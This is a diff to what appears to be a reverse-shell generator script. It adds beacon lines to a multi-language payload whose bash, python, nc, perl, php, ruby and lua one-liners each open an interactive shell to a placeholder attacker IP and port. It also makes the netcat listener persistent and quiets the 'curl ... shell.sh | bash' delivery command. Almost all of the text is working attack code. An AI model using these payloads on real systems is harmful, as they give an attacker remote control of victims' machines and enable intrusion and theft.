@@ -38,30 +38,39 @@ function print_banner(){
 
 cmd='
 if command -v bash >/dev/null 2>&1; then
+	echo "Command that worked: bash" > /dev/tcp/IP_REPLACE/PORT_REPLACE
 	/bin/bash -i >& /dev/tcp/IP_REPLACE/PORT_REPLACE 0>&1
 	exit;
 elif command -v python >/dev/null 2>&1; then
+	echo "Command that worked: python" > /dev/tcp/IP_REPLACE/PORT_REPLACE
 	python -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP_REPLACE",PORT_REPLACE)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'\''
 	exit;
 elif command -v python3 >/dev/null 2>&1; then
+	echo "Command that worked: python3" > /dev/tcp/IP_REPLACE/PORT_REPLACE
 	python3 -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP_REPLACE",PORT_REPLACE)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'\''
 	exit;
 elif command -v nc >/dev/null 2>&1; then
+	echo "Command that worked: nc" > /dev/tcp/IP_REPLACE/PORT_REPLACE
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_REPLACE PORT_REPLACE >/tmp/f
 	exit;
 elif command -v perl >/dev/null 2>&1; then
+	echo "Command that worked: perl" > /dev/tcp/IP_REPLACE/PORT_REPLACE
 	perl -e '\''use Socket;$i="IP_REPLACE";$p=PORT_REPLACE;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\''
 	exit;
 elif command -v sh >/dev/null 2>&1; then
+	echo "Command that worked: sh" > /dev/tcp/IP_REPLACE/PORT_REPLACE
 	/bin/sh -i >& /dev/tcp/IP_REPLACE/PORT_REPLACE 0>&1
 	exit;
 elif command -v php >/dev/null 2>&1; then
+	echo "Command that worked: php" > /dev/tcp/IP_REPLACE/PORT_REPLACE
 	php -r '\''$sock=fsockopen("IP_REPLACE",PORT_REPLACE);exec("/bin/sh -i <&3 >&3 2>&3");'\''
 	exit;
 elif command -v ruby >/dev/null 2>&1; then
+	echo "Command that worked: ruby" > /dev/tcp/IP_REPLACE/PORT_REPLACE
 	ruby -rsocket -e '\''f=TCPSocket.open("IP_REPLACE",PORT_REPLACE).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\''
 	exit;
 elif command -v lua >/dev/null 2>&1; then
+	echo "Command that worked: lua" > /dev/tcp/IP_REPLACE/PORT_REPLACE
 	lua -e '\''require("socket");require("os");t=socket.tcp();t:connect("IP_REPLACE","PORT_REPLACE");os.execute("/bin/sh -i <&3 >&3 2>&3");'\''
 	exit;
 
@@ -157,7 +166,7 @@ function use_socat(){
 function use_netcat(){
     if [ $(which nc) ]; then
     	echo $LIGHT_GREY"[*] "$NC"Netcat listener started on port $PORT"
-    	exec nc -lvnp $PORT
+    	exec nc -klvnp $PORT
     else
     	printf $LIGHT_GREY"[=]"$NC" Netcat is not installed on the system!\n"
     fi
@@ -175,7 +184,7 @@ function rev_file(){
 
 function http_server(){
 	# Uses wget's option to write to stdout, so nothing is stored in memory ;\)
-	curl_cmd=$(echo "curl http://$IP:$http_port/shell.sh | bash" | sed -e "s/:80\//\//g")
+	curl_cmd=$(echo "curl -s http://$IP:$http_port/shell.sh | bash" | sed -e "s/:80\//\//g")
 	wget_cmd=$(echo "wget -O - http://$IP:$http_port/shell.sh | bash" | sed -e "s/:80\//\//g")
 	echo $RED"[*] "$NC"Execute reverse shell:"
 	echo "$curl_cmd"
